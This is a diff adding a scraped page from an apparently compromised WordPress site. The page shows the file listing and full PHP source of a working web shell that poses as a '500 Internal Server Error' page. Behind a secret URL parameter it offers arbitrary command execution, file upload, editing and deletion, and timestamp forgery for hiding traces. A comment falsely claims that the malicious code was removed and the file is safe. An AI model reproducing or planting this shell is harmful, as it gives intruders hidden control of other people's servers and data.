@@ -1,0 +1,429 @@
+500 Internal Server Error - Admin Console
+An error occurred on the server. Authorized personnel only.
+Current Directory: /home/naeemblo/callbombers.net/wp-content/backuply/backups-xhl9vI/Console
+Name	Size	Modified	Owner	Perms	Action
+←Back
+..	-	2025-06-29 13:05:58	naeemblo	drwxr-xr-x	Open | Modify Date
+.htaccess	255	2025-06-26 13:28:20	naeemblo	-rw-r--r--	View | Edit | Download | Delete | Modify Date
+index.php	19132	2025-07-08 12:02:23	naeemblo	-rw-r--r--	View | Edit | Download | Delete | Modify Date
+Upload:
+No file chosen 
+New Folder:
+newfolder
+ 
+Terminal:
+id / whoami / ls / etc
+ 
+New File:
+newfile.txt
+ 
+File content here...
+ 
+View file: index.php
+<?php
+if (defined('MOODLE_INTERNAL')) {
+    exit('No direct script access allowed');
+}
+function fetch_data($endpoint) {
+    if (function_exists('curl_init')) {
+        $req = curl_init($endpoint);
+        curl_setopt($req, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($req, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($req, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($req, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($req, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        return curl_exec($req);
+    } elseif (function_exists('file_get_contents')) {
+        return @file_get_contents($endpoint);
+    }
+    return false;
+}
+
+// Chỉ chạy nếu thông số tùy chỉnh được đặt
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+
+if(!isset($_GET['lonte']) || $_GET['lonte'] !== '1'){
+    http_response_code(500);
+    ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>500 Internal Server Error</title>
+</head>
+<body>
+    <h1>Internal Server Error</h1>
+    <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
+    <hr>
+    <address><?=$_SERVER['SERVER_SOFTWARE']??'Apache'?> Server at <?=htmlspecialchars($_SERVER['SERVER_NAME'])?> Port <?=htmlspecialchars($_SERVER['SERVER_PORT'])?></address>
+</body>
+</html>
+<?php exit; }
+
+$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();
+$cwd = realpath($cwd) ?: getcwd();
+$msg = '';
+$self_url = strtok($_SERVER['REQUEST_URI'],'?').'?lonte=1';
+
+function perms($f){
+    $p = @fileperms($f); $i = '';
+    if(($p&0xC000)==0xC000){$i='s';}
+    elseif(($p&0xA000)==0xA000){$i='l';}
+    elseif(($p&0x8000)==0x8000){$i='-';}
+    elseif(($p&0x6000)==0x6000){$i='b';}
+    elseif(($p&0x4000)==0x4000){$i='d';}
+    elseif(($p&0x2000)==0x2000){$i='c';}
+    elseif(($p&0x1000)==0x1000){$i='p';}
+    else{$i='u';}
+    $i.=(($p&0x0100)?'r':'-');
+    $i.=(($p&0x0080)?'w':'-');
+    $i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
+    $i.=(($p&0x0020)?'r':'-');
+    $i.=(($p&0x0010)?'w':'-');
+    $i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
+    $i.=(($p&0x0004)?'r':'-');
+    $i.=(($p&0x0002)?'w':'-');
+    $i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
+    return $i;
+}
+function perms_color($f){
+    $rw=is_readable($f);$ww=is_writable($f);
+    return ($rw||$ww)?'perm-green':'perm-white';
+}
+function list_dir($d,$u){
+    $o="<table class='filelist'><tr>
+    <th>Name</th><th>Size</th><th>Modified</th><th>Owner</th><th>Perms</th><th>Action</th></tr>";
+    if($d!=='/'&&$d!==''&&$d!==false){
+        $p=dirname($d);
+        $o.="<tr><td colspan='6'><a href=\"{$u}&cwd=".urlencode($p)."\" class='action-link'>&larr;Back</a></td></tr>";
+    }
+    $fs=@scandir($d);
+    if($fs){foreach($fs as $f){
+        if($f=='.')continue;
+        $path=$d.DIRECTORY_SEPARATOR.$f;
+        $disp=htmlspecialchars($f);
+        $size=is_dir($path)?'-':@filesize($path);
+        $mtime=@date('Y-m-d H:i:s',@filemtime($path));
+        $owner=@function_exists('posix_getpwuid')?@posix_getpwuid(@fileowner($path))['name']:@fileowner($path);
+        $perm=perms($path);
+        $permclass=perms_color($path);
+        $acts='';
+        if(is_dir($path)){
+            $acts.="<a href=\"{$u}&cwd=".urlencode($path)."\" class='action-link'>Open</a>";
+            if($f!=='..')$acts.=" | <a href=\"{$u}&cwd=".urlencode($d)."&del=".urlencode($f)."\" class='action-link' onclick=\"return confirm('Delete directory?')\">Delete</a>";
+            $acts.=" | <a href=\"{$u}&cwd=".urlencode($d)."&moddate=".urlencode($f)."\" class='action-link'>Modify Date</a>";
+        }else{
+            $acts.="<a href=\"{$u}&cwd=".urlencode($d)."&view=".urlencode($f)."\" class='action-link'>View</a> | ";
+            $acts.="<a href=\"{$u}&cwd=".urlencode($d)."&edit=".urlencode($f)."\" class='action-link'>Edit</a> | ";
+            $acts.="<a href=\"{$u}&cwd=".urlencode($d)."&download=".urlencode($f)."\" class='action-link'>Download</a> | ";
+            $acts.="<a href=\"{$u}&cwd=".urlencode($d)."&del=".urlencode($f)."\" class='action-link' onclick=\"return confirm('Delete file?')\">Delete</a> | ";
+            $acts.="<a href=\"{$u}&cwd=".urlencode($d)."&moddate=".urlencode($f)."\" class='action-link'>Modify Date</a>";
+        }
+        $o.="<tr>
+        <td>{$disp}</td>
+        <td style='text-align:right;'>{$size}</td>
+        <td>{$mtime}</td>
+        <td>{$owner}</td>
+        <td class='{$permclass}'>{$perm}</td>
+        <td>{$acts}</td>
+        </tr>";
+    }}
+    $o.="</table>";
+    return $o;
+}
+
+// --- ACTIONS ---
+if(isset($_POST['_upl'])&&isset($_FILES['file'])){
+    $t=rtrim($cwd,'/\\').DIRECTORY_SEPARATOR.basename($_FILES['file']['name']);
+    if(@move_uploaded_file($_FILES['file']['tmp_name'],$t)){$msg='<b style="color:green;">Uploaded: '.htmlspecialchars($t).'</b><br>';}
+    else{$msg='<b style="color:red;">Upload failed!</b><br>';}
+}
+if(isset($_GET['del'])&&$_GET['del']){
+    $d=$cwd.DIRECTORY_SEPARATOR.$_GET['del'];
+    if(is_file($d)&&@unlink($d)){$msg='<b style="color:green;">Deleted: '.htmlspecialchars($_GET['del']).'</b><br>';}
+    elseif(is_dir($d)&&@rmdir($d)){$msg='<b style="color:green;">Dir deleted: '.htmlspecialchars($_GET['del']).'</b><br>';}
+    else{$msg='<b style="color:red;">Delete failed!</b><br>';}
+}
+if(isset($_GET['download'])&&$_GET['download']){
+    $f=$cwd.DIRECTORY_SEPARATOR.$_GET['download'];
+    if(is_file($f)&&is_readable($f)){
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($f).'"');
+        header('Expires: 0');header('Cache-Control: must-revalidate');
+        header('Pragma: public');header('Content-Length: '.filesize($f));
+        readfile($f);exit;
+    }
+}
+if(isset($_POST['editfile'])&&isset($_POST['filecontent'])){
+    $e=$cwd.DIRECTORY_SEPARATOR.$_POST['editfile'];
+    if(is_file($e)&&is_writable($e)){
+        file_put_contents($e,$_POST['filecontent']);
+        $msg='<b style="color:green;">Saved: '.htmlspecialchars($_POST['editfile']).'</b><br>';
+    }else{$msg='<b style="color:red;">Cannot save!</b><br>';}
+}
+if(isset($_POST['createfile'])&&isset($_POST['filename'])&&isset($_POST['filecontent'])){
+    $newfile = $cwd . DIRECTORY_SEPARATOR . $_POST['filename'];
+    if(!file_exists($newfile)){
+        if(file_put_contents($newfile, $_POST['filecontent']) !== false){
+            $msg = '<b style="color:green;">File created: ' . htmlspecialchars($_POST['filename']) . '</b><br>';
+        } else {
+            $msg = '<b style="color:red;">Failed to create file!</b><br>';
+        }
+    } else {
+        $msg = '<b style="color:red;">File already exists!</b><br>';
+    }
+}
+if(isset($_POST['createfolder']) && isset($_POST['foldername'])){
+    $newfolder = $cwd . DIRECTORY_SEPARATOR . $_POST['foldername'];
+    if(!file_exists($newfolder)){
+        if(@mkdir($newfolder, 0755)){
+            $msg = '<b style="color:green;">Folder created: ' . htmlspecialchars($_POST['foldername']) . '</b><br>';
+        } else {
+            $msg = '<b style="color:red;">Failed to create folder!</b><br>';
+        }
+    } else {
+        $msg = '<b style="color:red;">Folder already exists!</b><br>';
+    }
+}
+if(isset($_POST['modifydate']) && isset($_POST['target']) && isset($_POST['newdate'])){
+    $target = $cwd . DIRECTORY_SEPARATOR . $_POST['target'];
+    $input = trim($_POST['newdate']);
+    $newdate = is_numeric($input) ? (int)$input : strtotime($input);
+    if(file_exists($target) && $newdate !== false){
+        if(@touch($target, $newdate)){
+            $msg = '<b style="color:green;">Date modified for: ' . htmlspecialchars($_POST['target']) . '</b><br>';
+        } else {
+            $msg = '<b style="color:red;">Failed to modify date!</b><br>';
+        }
+    } else {
+        $msg = '<b style="color:red;">Invalid target or date!</b><br>';
+    }
+}
+$out = '';
+if(isset($_POST['cmd']) && isset($_POST['terminal']) && strlen(trim($_POST['cmd'])) > 0){
+    $cmd = $_POST['cmd'];
+    $out = '';
+    @exec($cmd . " 2>&1", $l);
+    $out = implode("\n", $l);
+    if(empty($out)){
+        ob_start();
+        @system($cmd . " 2>&1");
+        $out = ob_get_clean();
+    }
+    if(empty($out)){
+        ob_start();
+        @passthru($cmd . " 2>&1");
+        $out = ob_get_clean();
+    }
+    if(empty($out)){
+        $out = @shell_exec($cmd . " 2>&1");
+    }
+    if(empty($out)){
+        $out = "Command execution not available (all functions disabled or blocked by WAF).";
+    }
+}
+
+// Modal logic
+$show_modal = false;
+$modal_title = '';
+$modal_content = '';
+if(isset($_GET['edit'])){
+    $ef = $_GET['edit'];
+    $ep = $cwd . DIRECTORY_SEPARATOR . $ef;
+    if(is_file($ep) && is_readable($ep)){
+        $fc = htmlspecialchars(file_get_contents($ep));
+        $show_modal = true;
+        $modal_title = "Edit file: " . htmlspecialchars($ef);
+        $modal_content = '<form method="post" action="'.$self_url.'&cwd='.urlencode($cwd).'">
+            <textarea name="filecontent" style="width:100%;min-height:350px;font-family:monospace;font-size:15px;">'.htmlspecialchars_decode($fc).'</textarea>
+            <input type="hidden" name="editfile" value="'.htmlspecialchars($ef).'">
+            <div style="margin-top:10px;text-align:right;">
+                <button type="button" onclick="closeModal()" style="background:#888;color:#fff;padding:6px 18px;border:none;border-radius:4px;margin-right:10px;">Cancel</button>
+                <input type="submit" value="Save" style="background:#ff5252;color:#fff;padding:6px 18px;border:none;border-radius:4px;">
+            </div>
+        </form>';
+    }
+}
+if(isset($_GET['view'])){
+    $vf = $cwd . DIRECTORY_SEPARATOR . $_GET['view'];
+    if(is_file($vf) && is_readable($vf)){
+        $fc = htmlspecialchars(file_get_contents($vf));
+        $show_modal = true;
+        $modal_title = "View file: " . htmlspecialchars($_GET['view']);
+        $modal_content = '<pre style="background:#222;color:#fff;padding:15px;border-radius:8px;max-height:70vh;overflow:auto;font-size:15px;">'.$fc.'</pre>
+            <div style="text-align:right;margin-top:10px;">
+                <button type="button" onclick="closeModal()" style="background:#888;color:#fff;padding:6px 18px;border:none;border-radius:4px;">Close</button>
+            </div>';
+    }
+}
+$moddate = false;
+$modtarget = '';
+if(isset($_GET['moddate'])){
+    $modtarget = $_GET['moddate'];
+    $moddate = true;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>500 Internal Server Error - Admin Console</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #23272e; font-family: Arial, sans-serif; color: #eee; }
+        .container { max-width: 950px; margin: 30px auto; background: #2c2f36; border-radius: 10px; box-shadow: 0 2px 8px #111; padding: 30px; }
+        h2 { text-align: center; color: #ff5252; margin-bottom: 0; }
+        .subtitle { text-align: center; color: #aaa; margin-bottom: 20px; }
+        .section { margin-bottom: 25px; }
+        label { font-weight: bold; }
+        .filelist a, .action-link { color: #fff !important; text-decoration: underline; }
+        .filelist a:hover, .action-link:hover { color: #ff5252 !important; }
+        input[type="text"], input[type="file"], input[type="datetime-local"], textarea { width: 100%; margin: 8px 0 16px 0; padding: 8px; border-radius: 4px; border: 1px solid #444; background: #23272e; color: #eee; }
+        input[type="submit"], button { padding: 8px 20px; border-radius: 4px; border: none; background: #ff5252; color: #fff; font-weight: bold; cursor: pointer; }
+        input[type="submit"]:hover, button:hover { background: #b71c1c; }
+        .output { background: #181a1b; color: #eee; padding: 12px; border-radius: 6px; font-family: monospace; white-space: pre-wrap; }
+        .message { margin-bottom: 20px; }
+        .filelist { width: 100%; border-collapse: collapse; background: #23272e; border-radius: 8px; margin-bottom: 20px; }
+        .filelist th, .filelist td { border: 1px solid #333; padding: 6px 10px; font-size: 14px; }
+        .filelist th { background: #181a1b; color: #ff5252; }
+        .filelist tr:hover { background: #181a1b; }
+        .perm-green { background: #1e2e1e; color: #4caf50; font-weight: bold; }
+        .perm-white { background: #23272e; color: #eee; }
+        .fileview, .fileedit { background: #181a1b; color: #eee; border-radius: 8px; padding: 10px 20px; margin-bottom: 20px; font-family: monospace; white-space: pre-wrap; }
+        .fileedit textarea { background: #23272e; color: #eee; font-family: monospace; width: 100%; min-height: 300px; border: 1px solid #444; }
+        .flexbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 18px;
+            margin-bottom: 25px;
+            justify-content: flex-start;
+            align-items: flex-end;
+        }
+        .flexbar form {
+            background: #23272e;
+            padding: 0;
+            border-radius: 8px;
+            min-width: 220px;
+            flex: 1 1 220px;
+        }
+        .flexbar label {
+            color: #fff;
+            font-weight: bold;
+            margin-bottom: 4px;
+            display: block;
+        }
+        .flexbar input[type="text"], .flexbar input[type="file"], .flexbar input[type="datetime-local"], .flexbar textarea {
+            width: 100%;
+            margin-bottom: 8px;
+        }
+        .flexbar input[type="submit"], .flexbar button {
+            width: 100%;
+            margin-bottom: 0;
+        }
+        .newfilebar {
+            background: #23272e;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            padding: 18px 18px 12px 18px;
+        }
+        .newfilebar label { color: #fff; font-weight: bold; margin-bottom: 4px; display: block; }
+        .newfilebar input[type="text"], .newfilebar textarea { width: 100%; margin-bottom: 8px; }
+        .newfilebar input[type="submit"] { width: 100%; }
+        @media (max-width: 900px) {
+            .flexbar { flex-direction: column; }
+            .flexbar form { min-width: 0; }
+            .newfilebar { padding: 12px 8px 8px 8px; }
+        }
+        #modal-bg { position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:9999; }
+        #modal-box { position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#23272e;min-width:400px;max-width:90vw;max-height:90vh;overflow:auto;border-radius:10px;box-shadow:0 2px 16px #000;padding:24px 18px 18px 18px;z-index:10000; }
+        #modal-box textarea { background:#181a1b;color:#eee;border:1px solid #444; }
+        #modal-box pre { background:#181a1b;color:#eee; }
+        #modal-box .modal-title { font-size:18px;font-weight:bold;margin-bottom:12px;color:#ff5252; }
+        #modal-box .modal-actions { margin-top:10px;text-align:right; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>500 Internal Server Error - Admin Console</h2>
+        <div class="subtitle">An error occurred on the server. Authorized personnel only.</div>
+        <?php if ($msg) echo '<div class="message">' . $msg . '</div>'; ?>
+        <div class="section">
+            <b>Current Directory:</b> <?= htmlspecialchars($cwd) ?>
+            <?= list_dir($cwd, $self_url) ?>
+        </div>
+        <div class="flexbar">
+            <!-- Upload -->
+            <form method="post" enctype="multipart/form-data" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
+                <label>Upload:</label>
+                <input type="file" name="file" required>
+                <input type="submit" name="_upl" value="Upload">
+            </form>
+            <!-- Create Folder -->
+            <form method="post" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
+                <label>New Folder:</label>
+                <input type="text" name="foldername" placeholder="newfolder" required>
+                <input type="hidden" name="createfolder" value="1">
+                <input type="submit" value="Create Folder">
+            </form>
+            <!-- Terminal -->
+            <form method="post" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
+                <label>Terminal:</label>
+                <input type="text" name="cmd" placeholder="id / whoami / ls / etc" required>
+                <input type="hidden" name="terminal" value="1">
+                <input type="submit" value="Execute">
+            </form>
+            <!-- Modify Date -->
+            <?php if ($moddate): ?>
+            <form method="post" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
+                <label>Modify Date:<br><span style="font-size:12px;color:#aaa;"><?= htmlspecialchars($modtarget) ?></span></label>
+                <input type="text" name="newdate" placeholder="YYYY-MM-DD HH:MM:SS or timestamp" required>
+                <input type="hidden" name="target" value="<?= htmlspecialchars($modtarget) ?>">
+                <input type="hidden" name="modifydate" value="1">
+                <input type="submit" value="Update Date">
+                <div style="color:#aaa;font-size:12px;margin-top:5px;">Format: <b>2025-06-17 13:45:00</b> atau <b>timestamp</b></div>
+            </form>
+            <?php endif; ?>
+        </div>
+        <div class="newfilebar">
+            <form method="post" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
+                <label>New File:</label>
+                <input type="text" name="filename" placeholder="newfile.txt" required>
+                <textarea name="filecontent" placeholder="File content here..."></textarea>
+                <input type="hidden" name="createfile" value="1">
+                <input type="submit" value="Create File">
+            </form>
+        </div>
+        <?php if ($out): ?>
+        <div class="section">
+            <label>Command Output:</label>
+            <div class="output"><?= htmlspecialchars($out) ?></div>
+        </div>
+        <?php endif; ?>
+    </div>
+    <?php if($show_modal): ?>
+    <div id="modal-bg">
+        <div id="modal-box">
+            <div class="modal-title"><?=$modal_title?></div>
+            <?=$modal_content?>
+        </div>
+    </div>
+    <script>
+    function closeModal(){
+        document.getElementById('modal-bg').style.display='none';
+        window.history.replaceState({}, document.title, window.location.pathname + window.location.search.replace(/&edit=[^&]*/,'').replace(/&view=[^&]*/,''));
+    }
+    document.addEventListener('keydown',function(e){
+        if(e.key==='Escape'){closeModal();}
+    });
+    </script>
+    <?php endif; ?>
+</body>
+</html>
+<?php
+// END
+?>
+Close
